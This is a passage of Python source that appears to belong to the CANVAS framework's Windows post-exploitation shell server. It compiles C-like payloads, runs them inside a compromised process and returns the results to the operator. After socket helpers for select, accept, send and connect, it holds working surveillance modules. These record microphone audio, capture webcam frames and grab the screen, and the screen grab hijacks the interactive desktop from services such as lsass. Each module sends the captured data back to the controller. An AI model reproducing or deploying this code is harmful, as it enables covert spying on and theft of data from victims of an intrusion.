        self.leave()
        #print "After readblock"
        return ret

    def isactive(self,fd,timeout=0):
        """
        Checks to see if fd is readable
        """

        if timeout==None:
            timeout=0
        code="""
         #import "remote", "ws2_32.dll|select" as "select"
         #import "local", "sendint" as "sendint"
         #import "int", "fd" as "fd"
         #import "int", "timeout" as "timeout"
         #import "local", "debug" as "debug"

         struct  fd_set {
                    int fd_count;
                    int fd;
         };
         struct timeval {
                 int tv_sec;
                 int tv_usec; };
         void main()
          {
         int i;
         char buf[1000];
         int r;
         struct fd_set readfd;
         struct timeval tv;

         readfd.fd_count=1;
         readfd.fd = fd;

         tv.tv_usec= 0;
         tv.tv_sec = timeout;

         //timeout is in seconds
         i=select(1, &readfd, 0, 0, &tv);

         if( i > 0 ) {
                 //debug();
                 // Theoretically, we dont need to check if fd is our fd, cause we
                 // only send one fd, our fd :D
                 sendint(1);
         }
         else
         {
         //socket is not active (waiting for a recv)
                 sendint(0);
         }
         }

         """
        vars={}
        vars["fd"]=fd
        vars["timeout"]=timeout
        self.clearfunctioncache()
        message=self.compile(code,vars)
        self.sendrequest(message)
        #print "Before readblock"
        ret=self.readint()
        self.leave()
        #print "After readblock"

        devlog("ret","Return Value: %d" % ret)
        return ret

    def accept(self,fd):
        logging.debug("Inside accept")
        #TODO: make asyncronous!
        code="""
        #import "remote","ws2_32.dll|accept" as "accept"
        #import "remote","ws2_32.dll|WSAGetLastError" as "WSAGetLastError"
        //#import "local", "accept" as "accept"
        #import "int", "fd" as "fd"
        #import "local", "sendint" as "sendint"
        #include "socket.h"
        void main()
        {
        int i;
        int error_code;
        struct sockaddr_in sa;
        int len;
        i=accept(fd, &sa, &len);
        error_code = WSAGetLastError();
        sendint(i);
        sendint(sa.addr);
        sendint(error_code);
        }
        """
        vars={}
        vars["fd"]=fd
        logging.debug("Before clearfunctioncache")
        self.clearfunctioncache()
        message=self.compile(code,vars)
        logging.debug("Sending accept() message")
        self.sendrequest(message)
        ret=sint32(self.readint())
        addr=self.readint()
        error_code = self.readint()
        self.leave()
        logging.debug("Accept (%s) returning: %d" % (fd, ret))
        logging.debug("WSAGetLastError: %08x" % error_code)
        return ret

    def getsendcode(self,fd,buffer):
        """Reliable send to socket, returns a shellcode for use by Node and self"""
        devlog('shellserver::getsendcode', "(WINDOWS) Sending %d bytes to fd %d" % (len(buffer), fd))
        #this code sends back a 1 on success, 0 on fail
        code="""
        #import "int", "length" as "length"
        #import "int", "fd" as "fd"
        #import "string", "buffer" as "buffer"
        #import "remote","ws2_32.dll|send" as "send"
        #import "local", "sendint" as "sendint"
        void main()
        {
          int i;
          char *p;
          int wanted;
          wanted=length;
          p=buffer;
          while (wanted > 0 ) {
          i=send(fd,p,wanted,0); // flags set to zero here
          if (i<0) {
            wanted=0;
            sendint(0);
            return;
           }
           wanted=wanted-i;
           p=p+i;
          }
           sendint(1);
        }
        """
        # XXX: check this with hasattr in MOSDEFNode
        # XXX: until everything is moved over
        self.special_shellserver_send = True
        vars={}
        vars["fd"]=fd
        vars["length"]=len(buffer)
        vars["buffer"]=buffer
        self.clearfunctioncache()
        message=self.compile(code,vars)
        return message

    def send(self,fd,buffer):
        """
        non-reliable send to socket
        """
        #print "XXX: check for getsendcode mismatch here! (in WINDOWS shellserver)"
        message=self.getsendcode(fd,buffer)
        self.sendrequest(message)
        ret=sint32(self.readint())
        self.leave()
        if ret==0:
            #failed to send data!
            raise Exception, "Failed to send data from win32MosdefShellServer"

        return len(buffer)

    def connect_sock(self,fd,host,port,proto,timeout):
        """
        Does a tcp connect, along with the corresponding socket() call.
        """
        #print "Connect_sock(%s,%s,%s,%s,%s)"%(fd,host,port,proto,timeout)
        code="""
        #import "int", "AF_INET" as "AF_INET"
        #import "int", "ip" as "ip"
        #import "int", "port" as "port"
        #import "int", "proto" as "proto"
        #import "int", "sockfd" as "sockfd"
        #import "int", "timeout" as "timeout"
        #import "int", "timeout_usec" as "timeout_usec"
        #include "socket.h"
        #import "remote","ws2_32.dll|connect" as "connect"
        #import "remote","ws2_32.dll|closesocket" as "closesocket"
        #import "remote","ws2_32.dll|socket" as "socket"
        #import "remote","ws2_32.dll|select" as "select"

        #import "local", "sendint" as "sendint"
        #import "local", "htons" as "htons"
        #import "local", "htonl" as "htonl"
        #import "local", "debug" as "debug"
       #import "int", "FIONBIO" as "FIONBIO"
       #import "remote", "ws2_32.dll|ioctlsocket" as "ioctlsocket"

       void setblocking(int sock,int blocking) {
       int NonBlock;
       if (blocking==0) {
             NonBlock=1;
       }
       else {
             NonBlock=0;
       }


       // Blocking   = 0
       // Noblocking = 1
       ioctlsocket(sock, FIONBIO, &NonBlock);
       }

        struct  fd_set {
                   int fd_count;
                   int fd;
        };
        struct timeval {
                int tv_sec;
                int tv_usec; };

        void main()
        {

          struct sockaddr_in serv_addr;
          int blocking;
          struct fd_set writefd;
          struct timeval tv;
         int i;

          serv_addr.family=AF_INET; //af_inet
          serv_addr.addr=htonl(ip);
          serv_addr.port=htons(port);
          //no idea how to do this on win32
          //blocking=getblock(sockfd);
          setblocking(sockfd,0);


          connect(sockfd,&serv_addr,16);

         writefd.fd_count=1;
         writefd.fd = sockfd;

         tv.tv_usec= timeout_usec;
         tv.tv_sec = timeout;

         //timeout is in seconds
         i=select(1, 0, &writefd, 0, &tv);
         //i=writefd.fd;
         if (i==1) {
              sendint(0);
            }
            else {
              sendint(-1);
            }
         //setblocking(sockfd,blocking)
        }
        """
        hostlong=socket.gethostbyname(host) #resolve from remotehost
        hostlong=str2bigendian(socket.inet_aton(hostlong))

        #I had to add this because otherwise windows fails to work
        #at all. Windows sucks.
        if timeout<1:
            timeout=1

        #I added this too, which is now redundant, but whatever, it's
        #more strictly correct, I guess.
        timeout_usec=int((math.ceil(timeout)-timeout)*1000)
        timeout=int(math.floor(timeout))
        vars={}
        vars["ip"]=hostlong
        vars["port"]=port
        vars["proto"]=proto
        vars["sockfd"]=fd
        vars["timeout"]=timeout
        vars["timeout_usec"]=timeout_usec
        vars["FIONBIO"]  = 0x8004667eL
        vars["AF_INET"]=AF_INET
        self.clearfunctioncache()
        message=self.compile(code,vars)
        #print "Sending connect call"
        self.sendrequest(message)
        ret=sint32(self.readint())
        if ret == -1:
            #for us, closed and timed out are the same thing!
            ret=-2
        self.leave()
        return ret



    def socket(self,proto):
        """
        calls socket and returns a file descriptor or -1 on failure.
        """
        code="""
        #import "remote","ws2_32.dll|socket" as "socket"
        #import "int", "proto" as "proto"
        #import "int", "AF_INET" as "AF_INET"

        #import "local", "sendint" as "sendint"
        void main()
        {
          int i;
          i=socket(AF_INET,proto,0);
          sendint(i);
        }
        """
        if proto.lower()=="tcp":
            proto=SOCK_STREAM
        elif proto.lower()=="udp":
            proto=SOCK_DGRAM
        else:
            logging.error("Don't know anything about protocol %s in socket()" % proto)
            return -1

        vars={}
        vars["proto"]=proto
        vars["AF_INET"]=AF_INET

        self.clearfunctioncache()
        message=self.compile(code,vars)
        self.sendrequest(message)
        ret=sint32(self.readint())
        self.leave()
        return ret

    def connect(self,fd,host,port,proto,timeout):
        """
        Does a connect, along with the corresponding socket() call.
        """
        if proto.lower()=="tcp":
            proto=SOCK_STREAM
        elif proto.lower()=="udp":
            proto=SOCK_DGRAM
        else:
            logging.error("Protocol not recognized")
            return -1

        return self.connect_sock(fd,host,port,proto,timeout)

    def old_connect_sock(self,fd,host,port,proto,timeout):

        code="""
        #import "int", "AF_INET" as "AF_INET"
        #import "int", "proto" as "proto"
        #import "int", "ip" as "ip"
        #import "int", "port" as "port"
        #import "int", "fd" as "fd"

        #include "socket.h"
        #import "remote","ws2_32.dll|connect" as "connect"
        #import "remote","ws2_32.dll|closesocket" as "closesocket"
        #import "remote","ws2_32.dll|socket" as "socket"
        #import "local", "sendint" as "sendint"
        #import "local", "htons" as "htons"
        #import "local", "htonl" as "htonl"
        #import "local", "debug" as "debug"

        void main()
        {
          int sockfd;

          struct sockaddr_in serv_addr;

          serv_addr.family=AF_INET; //af_inet
          //debug();
          sockfd=socket(AF_INET,proto,0);
          //debug();
          serv_addr.addr=htonl(ip);
          serv_addr.port=htons(port);
          if (connect(sockfd,&serv_addr,16)==0) {
            sendint(sockfd);
          } else {
            sendint(-1);
            closesocket(sockfd);
          }
         }
        """
        hostlong=socket.gethostbyname(host) #resolve from remotehost
        hostlong=str2bigendian(socket.inet_aton(hostlong))
        vars={}
        vars["AF_INET"]=AF_INET
        vars["proto"]=proto
        vars["ip"]=hostlong
        vars["port"]=port
        self.clearfunctioncache()
        message=self.compile(code,vars)
        logging.debug("Sending connect call")
        self.sendrequest(message)
        ret=sint32(self.readint())
        self.leave()
        return ret



        ##################################################################################################
        #non-libc like things. Advanced modules. Etc.

    def recordaudio(self, seconds=10, progr=False):
        code ="""
        #import "remote", "winmm.dll|waveInGetDevCapsA" as "waveInGetDevCaps"
        #import "remote", "winmm.dll|waveInPrepareHeader" as "waveInPrepareHeader"
        #import "remote", "winmm.dll|waveInOpen" as "waveInOpen"
        #import "remote", "winmm.dll|waveInClose" as "waveInClose"
        #import "remote", "winmm.dll|waveInAddBuffer" as "waveInAddBuffer"
        #import "remote", "winmm.dll|waveInStart" as "waveInStart"
        #import "remote", "winmm.dll|waveInStop" as "waveInStop"
        #import "remote", "winmm.dll|waveInUnprepareHeader" as "waveInUnprepareHeader"
        #import "remote", "winmm.dll|waveInGetNumDevs" as "waveInGetNumDevs"
        #import "remote", "kernel32.dll|GlobalAlloc" as "GlobalAlloc"
        #import "remote", "kernel32.dll|GlobalFree" as "GlobalFree"
        #import "remote", "kernel32.dll|Sleep" as "Sleep"

        #import "local","sendstring" as "sendstring"
        #import "local","sendint" as "sendint"
        #import "local","memset" as "memset"
        #import "local","senddata2self" as "senddata2self"
	#import "int", "BUFFERSIZE" as "BUFFERSIZE"


        #import "local","debug" as "debug"

        struct WAVEFORMATEX {
          short    wFormatTag;
          short    nChannels;
          int      nSamplesPerSec;
          int      nAvgBytesPerSec;
          short    nBlockAlign;
          short    wBitsPerSample;
          short    cbSize;
        };


        struct WAVEHDRWAVEHDR {
           char     *lpData;
           int      dwBufferLength;
           int      dwBytesRecorded;
           int      dwUser;
           int      dwFlags;
           int      dwLoops;
           int     *lpNext;
           int     *reserved;
        };
        struct WAVEINCAPS {
          short      wMid;
          short      wPid;
          int        vDriverVersion;
          char       szPname[32];
          int        dwFormats;
          short      wChannels;
          short      wReserved1;
        };

        void main() {
	  struct WAVEINCAPS caps;
	  struct WAVEFORMATEX formatex;
          struct WAVEHDRWAVEHDR buffer;
	  int count;
          int idx;
	  int ret;
	  int index;
          int wavein;

	  count = waveInGetNumDevs();
	  sendint(count);

          index = 0;
	  formatex.cbSize = 0;
          formatex.wFormatTag = 1; // WAVE_FORMAT_PCM
          formatex.nChannels = 2;
	  formatex.wBitsPerSample = 8;
          formatex.nSamplesPerSec = 44100;
	  ret = formatex.wBitsPerSample / 8;
	  formatex.nBlockAlign = formatex.nChannels * ret;
	  formatex.nAvgBytesPerSec = formatex.nSamplesPerSec * formatex.nBlockAlign;

          ret = waveInOpen( &wavein, -1, &formatex, 0, 0,  0x0008  ); // WAVE_MAPPER=-1   WAVE_FORMAT_DIRECT= 0x0008
	  memset(&buffer, 0, 32);
          ret = waveInOpen( &wavein, -1, &formatex, 0, 0,  0x0000  ); // WAVE_MAPPER=-1   CALLBACK_NULL= 0x0008

          buffer.lpData = GlobalAlloc(0x40, BUFFERSIZE);
	  buffer.dwBufferLength = BUFFERSIZE;
          waveInPrepareHeader(wavein, &buffer, 32);
	  waveInAddBuffer(wavein, &buffer, 32);
	  waveInStart(wavein);
	  ret = 0;
	  while( ret != 1) {
	       ret = buffer.dwFlags & 0x1;
               Sleep(100);
	  }
	  waveInStop(wavein);
	  waveInUnprepareHeader(wavein, &buffer, 32);
	  senddata2self( buffer.lpData, BUFFERSIZE);

	  GlobalFree(0, buffer.lpData);
          waveInClose(wavein);

        }"""
        vars = {}
        #         Hz      bytes  channels
        sample = 44100 *  1    * 2
        vars["BUFFERSIZE"] = sample * seconds
        self.clearfunctioncache()
        request=self.compile(code,vars)
        if progr:
            progr("Sending recordaudio shellcode", 30.0)
        self.sendrequest(request)



        count  = self.readint()
        #for a in range(0, count):
        #	data = self.readblock()
        #	progr("%s" % str(data), 10)
        if count == 0:
            return None
        data = self.readblock()
        progr("Datalen: %d" % len(data), 40.0)
        self.leave()

        if progr:
            progr("Complete receiving audio for %d seconds " % seconds, 100.0)

        return data


    def recordvideo(self, fileobj = None, progr=False, seconds=10, filename="t.avi"):
        code ="""
	#import "remote", "user32.dll|FindWindowA" as "FindWindowA"
	#import "remote", "user32.dll|SendMessageA" as "SendMessageA"
	#import "remote", "avicap32.dll|capCreateCaptureWindowA" as "capCreateCaptureWindowA"
	#import "remote", "kernel32.dll|Sleep" as "Sleep"
        #import "string","filename" as "filename"
        #import "int","seconds" as "seconds"
        #import "local","sendint" as "sendint"

	struct CAPTUREPARMS {
	int dwRequestMicroSecPerFrame;
	int fMakeUserHitOKToCapture;
	int wPercentDropForError;
	int fYield;
	int dwIndexSize;
	int wChunkGranularity;
	int fUsingDOSMemory;
	int wNumVideoRequested;
	int fCaptureAudio;
	int wNumAudioRequested;
	int vKeyAbort;
	int fAbortLeftMouse;
	int fAbortRightMouse;
	int fLimitEnabled;
	int wTimeLimit;
	int fMCIControl;
	int fStepMCIDevice;
	int dwMCIStartTime;
	int dwMCIStopTime;
	int fStepCaptureAt2x;
	int wStepCaptureAverageFrames;
	int dwAudioBufferSize;
	int fDisableWriteCache;
	int AVStreamMaster;
	};


	void main() {
	  int proghwnd;
	  int hwnd;
	  int ret;
	  struct CAPTUREPARMS param;

	  proghwnd = FindWindowA("Progman", 0);
	  hwnd = capCreateCaptureWindowA("CANVAS", 0x40000000, 0, 0, 640, 480, proghwnd, 0);
	  SendMessageA(hwnd, 1024+10 ,0,0);  // wm_cap_driver_connect

	  SendMessageA(hwnd, 1024+65, 96, &param ); //  WM_CAP_GET_SEQUENCE_SETUP
	  param.fLimitEnabled = 1;
	  param.wTimeLimit = seconds;
	  SendMessageA(hwnd, 1024+64, 96, &param ); //  WM_CAP_SET_SEQUENCE_SETUP

	  SendMessageA(hwnd, 1024+20, 0, filename); // WM_CAP_FILE_SET_CAPTURE_FILE
	  SendMessageA(hwnd, 1024+62, 0, 0); //  WM_CAP_SEQUENCE
	  SendMessageA(hwnd, 1024+68, 0, 0); // VM_CAP_STOP
	  SendMessageA(hwnd, 1024+11, 0, 0); // VM_CAP_DISCONNECT
	  sendint(1);
	}
	"""
        vars = {}
        vars["filename"] = filename
        vars["seconds"]  = seconds

        self.clearfunctioncache()
        request=self.compile(code,vars)
        if progr:
            progr("Sending Video Record shellcode", 30.0)
        self.sendrequest(request)

        ret = self.readint()

        self.leave()
        if progr:
            progr("Completed receiving video", 100.0)

        return ret


    def recordvideowithoutfile(self, fileobj = None, progr=False):

        code ="""
#import "remote", "user32.dll|SendMessageA" as "SendMessageA"
#import "remote", "avicap32.dll|capCreateCaptureWindowA" as "capCreateCaptureWindowA"
#import "remote", "vfw32.dll|AVIFileOpenA" as AVIFileOpenA
#import "local","memset" as "memset"

        struct BITMAPINFOHEADER {
          int  biSize;
          int   biWidth;
          int   biHeight;
          short   biPlanes;
          short   biBitCount;
          int  biCompression;
          int  biSizeImage;
          int   biXPelsPerMeter;
          int    biYPelsPerMeter;
          int   biClrUsed;
          int   biClrImportant;
        };

        struct RGBQUAD {
          unsigned char     rgbBlue;
          unsigned char     rgbGreen;
          unsigned char     rgbRed;
          unsigned char     rgbReserved;
        };

        struct BITMAPINFO {
           struct BITMAPINFOHEADER bmiHeader;
           struct RGBQUAD          bmiColors[1]; //not sure what to do about that
        };
        struct BITMAP {
		int bmType;
		int bmWidth;
		int bmHeight;
		int bmWidthBytes;
		short bmPlanes;
		short bmBitsPixel;
		int bmBits;
	};
	struct CAPSTATUS {
	    int     uiImageWidth;
	    int     uiImageHeight;
	    int     fLiveWindow;
	    int     fOverlayWindow;
	    int     fScale;
	    int    ptScroll;
	    int     fUsingDefaultPalette;
	    int     fAudioHardware;
	    int     fCapFileExists;
	    int    dwCurrentVideoFrame;
	    int    dwCurrentVideoFramesDropped;
	    int    dwCurrentWaveSamples;
	    int    dwCurrentTimeElapsedMS;
	    int     hPalCurrent;
	    int     fCapturingNow;
	    int    dwReturn;
	    int     wNumVideoAllocated;
	    int     wNumAudioAllocated;
	};

	struct RECT {
	    int left;
	    int top;
	    int right;
	    int bottom;
	};

	struct AVISTREAMINFO {
	    int fccType;
	    int fccHandler;
	    int dwFlags;
	    int dwCaps;
	    short  wPriority;
	    short  wLanguage;
	    int dwScale;
	    int dwRate;
	    int dwStart;
	    int dwLength;
	    int dwInitialFrames;
	    int dwSuggestedBufferSize;
	    int dwQuality;
	    int dwSampleSize;
	    struct RECT rcFrame;
	    int  dwEditCount;
	    int  dwFormatChangeCount;
	    char szName[64];
	};

	void VideoCallback(int hwnd, int lpVHdr) {
	    int d;
	}

        void main() {
          int hwnd;
	  int proghwnd;
          int hor;
          int vert;
          int hbitmap;
	  int bpp;
          int size;
          char *pBits;
          struct BITMAPINFOHEADER *pbih;
	  struct BITMAPINFO pbitmap;
	  struct CAPSTATUS caps;
	  struct AVISTREAMINFO strhdr1;
	  int pf1;
	  int ps1;
          int hr;


	  proghwnd = FindWindowA("Progman", 0);
	  hwnd = capCreateCaptureWindowA("CANVAS", 0x40000000, 0, 0, 640, 480, proghwnd, 0);
	  SendMessageA(hwnd, 1024+10 ,0,0);  // wm_cap_driver_connect

	  hr = AVIFileOpen(&pf1, "bleh.avi", 4097, 0);

	  memset(&pbitmap, 0, 44);
	  SendMessageA(hwnd, 1024+44, &pbitmap, 44); // WM_CAP_GET_VIDEOFORMAT
	  //capGetVideoFormat(hwdc, &pbitmap, 44);
          pbih = &pbitmap.bmiHeader;
	  pbih->biSize = 44;
	  pbih->biPlanes = 1;
	  //capGetStatus(hwdc, &capstatus1, 72);
	  SendMessageA(hwnd, 1024+54, &caps, 0x48); // WM_CAP_GET_STATUS

	  pbih->biWidth = caps.uiImageWidth;
	  pbih->biHeight = caps.uiImageHeight;
	  pbih->biSizeImage = caps.uiImageWidth * caps.uiImageHeight * 3;
	  pbih->biBitCount = 24;
	  pbih->biCompression = 0; // BI_RGB

	  memset(&strhdr1, 0, 140);
	  strhdr1.fccType = 0x73646976;
	  strhdr1.fccHandler = 0;
	  strhdr1.dwScale = 1;
	  strhdr1.dwRate = 5;
	  strhdr1.dwSuggestedBufferSize = pbih->biSizeImage;
	  strhdr1.dwQuality = -1;
	  SetRect(&strhdr1.rcFrame, 0, 0, pbih->biWidth, pbih->biHeight);
	  hr = AVIFileCreateStream(pf1, &ps1, &strhdr1);
	  hr = AVIStreamSetFormat(ps1, 0, &pbitmap, pbih->biSize + pbih->biClrUsed * 4);

	  // set callback proc
	  capSetCallbackOnFrame(hwnd, VideoCallback);

	}
	"""
    def webcamshot(self, fileobj = None, progr=False, seconds=2):

        code ="""
        #import "remote", "user32.dll|FindWindowA" as "FindWindowA"
        #import "remote", "user32.dll|GetForegroundWindow" as "GetForegroundWindow"
        #import "remote", "user32.dll|SendMessageA" as "SendMessageA"
        #import "remote", "user32.dll|OpenClipboard" as "OpenClipboard"
        #import "remote", "user32.dll|CloseClipboard" as "CloseClipboard"
        #import "remote", "user32.dll|GetClipboardData" as "GetClipboardData"
        #import "remote", "user32.dll|IsClipboardFormatAvailable" as "IsClipboardFormatAvailable"
	#import "remote", "avicap32.dll|capCreateCaptureWindowA" as "capCreateCaptureWindowA"
        #import "remote", "kernel32.dll|GlobalLock" as "GlobalLock"
        #import "remote", "kernel32.dll|GlobalUnlock" as "GlobalUnlock"
	#import "remote", "kernel32.dll|Sleep" as "Sleep"
	#import "int","seconds" as "seconds"



        #import "local","sendstring" as "sendstring"
        #import "local","sendint" as "sendint"
        #import "local","memset" as "memset"
        #import "local","senddata2self" as "senddata2self"

        #import "local","debug" as "debug"

        struct BITMAPINFOHEADER {
          int  biSize;
          int   biWidth;
          int   biHeight;
          short   biPlanes;
          short   biBitCount;
          int  biCompression;
          int  biSizeImage;
          int   biXPelsPerMeter;
          int    biYPelsPerMeter;
          int   biClrUsed;
          int   biClrImportant;
        };

        struct RGBQUAD {
          unsigned char     rgbBlue;
          unsigned char     rgbGreen;
          unsigned char     rgbRed;
          unsigned char     rgbReserved;
        };

        struct BITMAPINFO {
           struct BITMAPINFOHEADER bmiHeader;
           struct RGBQUAD          bmiColors[1]; //not sure what to do about that
        };
        struct BITMAP {
		int bmType;
		int bmWidth;
		int bmHeight;
		int bmWidthBytes;
		short bmPlanes;
		short bmBitsPixel;
		int bmBits;
	};

        void main() {
          int hwnd;
	  int proghwnd;
          int hor;
          int vert;
          int hbitmap;
	  int bpp;
          int size;
          char *pBits;
	  struct BITMAP bp;
          struct BITMAPINFOHEADER *pbih;
          struct BITMAPINFO bi;
	  struct RGBQUAD *rq;
	  int ret;

	  //proghwnd = FindWindowA("Progman", 0);
	  proghwnd = GetForegroundWindow();
	  sendint(proghwnd);
	  if(proghwnd == 0) {
	      return 0;
	  }
	  hwnd = capCreateCaptureWindowA("CANVAS", 0x40000000, 0, 0, 160, 120, proghwnd, 0);
	  if(hwnd==0) {
	      hwnd = capCreateCaptureWindowA("CANVAS", 0x40000000, 0, 0, 320, 240, proghwnd, 0);
	  }
	  sendint(hwnd);
	  if(hwnd == 0) {
	      return 0;
	  }
	  ret = SendMessageA(hwnd, 1024+10 ,0,0);  // wm_cap_driver_connect
	  sendint(ret);
	  if(ret == 0) {
	      return 0;
	  }
	  SendMessageA(hwnd, 1024+50 ,1,0);  // wm_cap_set_preview
	  SendMessageA(hwnd, 1024+52 ,30,0); // set_previewrate
	  Sleep(seconds);

	  ret = SendMessageA(hwnd, 1084,0,0);      // get_frame
	  sendint(ret);
	  SendMessageA(hwnd, 1054,0,0);      // wm_cap_copy copy to clipboard
	  ret = OpenClipboard(hwnd);
	  sendint(ret);
	  if( IsClipboardFormatAvailable(8) == 0 ) {
	          sendint(0);
	  	  return 0;
	  }
	  hbitmap = GetClipboardData( 8 ); // CF_DIB
	  if( hbitmap == 0 ) {
	     sendint(-1);
	     return 0;
	  }
	  pbih = GlobalLock( hbitmap );

	  pBits = pbih + 49;

	  hor  = pbih->biWidth;
          vert = pbih->biHeight;
          bpp  = pbih->biBitCount/8;
	  size = hor * vert * bpp ;

          sendint(hor);
	  sendint(vert);
	  sendint(pbih);
	  senddata2self(pBits, size);

	  SendMessageA(hwnd, 1024+11, 0,0);  // disconnectaS
	  CloseClipboard( hwnd);
	  GlobalUnlock( hbitmap );

        }"""
        vars = {}
        vars["seconds"] = seconds * 1000
        self.clearfunctioncache()
        request=self.compile(code,vars)
        if progr:
            progr("Sending webcamshot shellcode", 30.0)
        self.sendrequest(request)

        proghwnd = self.readint()
        devlog("webcam", "Proghwnd: %x" % proghwnd)
        if proghwnd == 0:
            devlog("webcam", "Failed to adquire a Window (GetForegroundWindow failed)")
            if progr:
                progr("Failed to adquire a Window (GetForegroundWindow failed)", 40.0)
            self.leave()
            return -1, -1, None
        hwnd = self.readint()
        devlog("webcam", "HWND: %x" % hwnd)
        if hwnd == 0:
            devlog("webcam", "Webcam connection failed (capCreateCaptureWindow)")
            if progr:
                progr("Webcam connection failed (capCreateCaptureWindow)", 40.0)
            self.leave()
            return -1, -1, None

        connect = self.readint()
        devlog("webcam", "Connect: %x" % connect)
        if connect == 0:
            devlog("webcam", "Webcam connection failed (Webcam not plugged?)")
            if progr:
                progr("Webcam connection failed (Webcam not plugged?)", 40.0)
            self.leave()
            return -1, -1, None
        getframe = self.readint()
        devlog("webcam", "getframe: %x" % getframe)
        openclipboard = self.readint()
        devlog("webcam", "Clipboard: %x" % openclipboard)

        hor  = self.readint()
        devlog("webcam", "Horizontal: %x" % hor)

        if hor in (0, 0xffffffff):
            devlog("webcam", "Failed to adquire a Clipboard (erorr: %x)" % hor)
            if progr:
                progr("Failed to adquire a Clipboard", 70.0)
            self.leave()
            return -1, -1, None

        vert = self.readint()
        devlog("webcam", "Vertical: %x" % vert)
        pbih = self.readint()
        devlog("webcam", "PBIH %x" % pbih)

        if progr:
            progr("Reading coordinates of screen", 80.0)

        data=""
        if progr:
            progr("Retrieving data", 60.0)

        if not fileobj:
            #just read the data into the file
            data=self.readblock()
        else:
            data=self.readblock(fileobj=fileobj)

        if progr:
            progr("Closing link with end", 90.0)

        #devlog("bmp", "BGR (RGB backwards) Data=%s"%hexprint(data[:100]))

        self.leave()
        if progr:
            progr("Completed receiving screenshot", 100.0)

        return hor,vert,data

    def screengrab(self, fileobj=None, progr=False):
        """
        captures a screen and sends it back
        http://msdn.microsoft.com/library/default.asp?url=/library/en-us/gdi/bitmaps_5a5h.asp
        http://www.codeproject.com/dialog/screencap.asp #better page
        You can actually do this three different ways
        1. GDI (most supported)
           GDI+ will allow you to convert between BMP and PNG/JPEG
        2. DirectX - will allow you to grab screenshots without the "black box" that
           games will generate to GDI. Requires D3D initialization.
        3. Windows Media (Requires COM fun)

        We're just trying for GDI here. Simple, effective, I hope.
        """

        vars={}
        vars["HORZRES"]=HORZRES #8
        vars["VERTRES"]=VERTRES #0xa
        vars["SRCCOPY"]=SRCCOPY #0xcc0020
        vars["CF_BITMAP"]=CF_BITMAP #2
        vars["DIB_RGB_COLORS"]=DIB_RGB_COLORS #0
        vars["BI_RGB"]=BI_RGB #0
        if progr:
            progr("Assembling screengrab shellcode", 10.0)
        code="""
        #import "remote", "user32.dll|GetDesktopWindow" as "GetDesktopWindow"
        #import "remote", "user32.dll|OpenWindowStationA" as "OpenWindowStationA"
        #import "remote", "user32.dll|CloseWindowStation" as "CloseWindowStation"
        #import "remote", "user32.dll|GetProcessWindowStation" as "GetProcessWindowStation"
        #import "remote", "user32.dll|SetProcessWindowStation" as "SetProcessWindowStation"
        #import "remote", "user32.dll|OpenInputDesktop" as "OpenInputDesktop"
        #import "remote", "user32.dll|CloseDesktop" as "CloseDesktop"
        #import "remote", "user32.dll|GetThreadDesktop" as "GetThreadDesktop"
        #import "remote", "user32.dll|SetThreadDesktop" as "SetThreadDesktop"
        #import "remote", "kernel32.dll|GetCurrentThreadId" as "GetCurrentThreadId"

        #import "remote", "user32.dll|GetDC" as "GetDC"
        #import "remote", "gdi32.dll|CreateDCA" as "CreateDCA"
        #import "remote", "gdi32.dll|CreateCompatibleDC" as "CreateCompatibleDC"
        #import "remote", "gdi32.dll|GetDeviceCaps" as "GetDeviceCaps"
        #import "remote", "gdi32.dll|CreateCompatibleBitmap" as "CreateCompatibleBitmap"
        #import "remote", "gdi32.dll|SelectObject" as "SelectObject"
        #import "remote", "gdi32.dll|BitBlt" as "BitBlt"
        #import "remote", "gdi32.dll|CreateDIBSection" as "CreateDIBSection"
        #import "remote", "gdi32.dll|DeleteObject" as "DeleteObject"
        #import "remote", "gdi32.dll|DeleteDC" as "DeleteDC"

        //uncomment for testing with the clipboard
        //#import "remote", "user32.dll|OpenClipboard" as "OpenClipboard"
        //#import "remote", "user32.dll|EmptyClipboard" as "EmptyClipboard"
        //#import "remote", "user32.dll|SetClipboardData" as "SetClipboardData"
        //#import "remote", "user32.dll|CloseClipboard" as "CloseClipboard"
        #import "local","sendstring" as "sendstring"
        #import "local","sendint" as "sendint"
        #import "local","memset" as "memset"
        #import "local","senddata2self" as "senddata2self"

        #import "int","HORZRES" as "HORZRES"
        #import "int","VERTRES" as "VERTRES"
        #import "int","SRCCOPY" as "SRCCOPY"
        #import "int","CF_BITMAP" as "CF_BITMAP"
        #import "int","DIB_RGB_COLORS" as "DIB_RGB_COLORS"
        #import "int","BI_RGB" as "BI_RGB"

        #import "local","debug" as "debug"

        struct BITMAPINFOHEADER {
          int  biSize;
          int   biWidth;
          int   biHeight;
          short   biPlanes;
          short   biBitCount;
          int  biCompression;
          int  biSizeImage;
          int   biXPelsPerMeter;
          int    biYPelsPerMeter;
          int   biClrUsed;
          int   biClrImportant;
        };

        struct RGBQUAD {
          unsigned char     rgbBlue;
          unsigned char     rgbGreen;
          unsigned char     rgbRed;
          unsigned char     rgbReserved;
        };

        struct BITMAPINFO {
           struct BITMAPINFOHEADER bmiHeader;
           struct RGBQUAD          bmiColors[1]; //not sure what to do about that
        };


        void main() {
          int hwnd;
          int dc;
          int newdc;
          int hor;
          int vert;
          int hBmpFileDC;
          int hfilebitmap;
          int hbitmap;
          int size;
          int threadid;
          char **pBits;
          struct BITMAPINFOHEADER *pbih;
          struct BITMAPINFO bi;
          int newwinsta;
          int oldwinsta;
          int topdesk;
          int olddesktop;

          //debug();

          //If you use GetDC you should ReleaseDC
          //if you createDC, you should DeleteDC
          //Don't use this because lsass doesn't have a screen. Want to grab the display instead
          //hwnd=GetDesktopWindow();

          //the following crap is to make sure we get the interactive desktop if we are in lsass
          //or another service
          newwinsta=OpenWindowStationA("WinSta0",0,0xc0000000); //read|write
          oldwinsta=GetProcessWindowStation();
          SetProcessWindowStation(newwinsta);

          //now desktop fun
          topdesk=OpenInputDesktop(0,0,0x20000000); //maximum allowed
          olddesktop=GetThreadDesktop(GetCurrentThreadId());
          SetThreadDesktop(topdesk);

          dc=GetDC(0); //Gets the desktop context
          threadid=GetCurrentThreadId();
          newdc=CreateCompatibleDC(dc);
          hor=GetDeviceCaps(newdc,HORZRES);
          vert=GetDeviceCaps(newdc,VERTRES);
          hbitmap=CreateCompatibleBitmap(dc,hor,vert);
          SelectObject(newdc,hbitmap);
          BitBlt(newdc,0,0,hor,vert,dc,0,0,SRCCOPY);

          //This little section is for testing that it worked by C-Ving into paint
          //If using VMWARE, it'll be a little weird, cause only when the VM has
          //focus will the clipboard work, or the screengrab work, or something
          //OpenClipboard(hwnd);
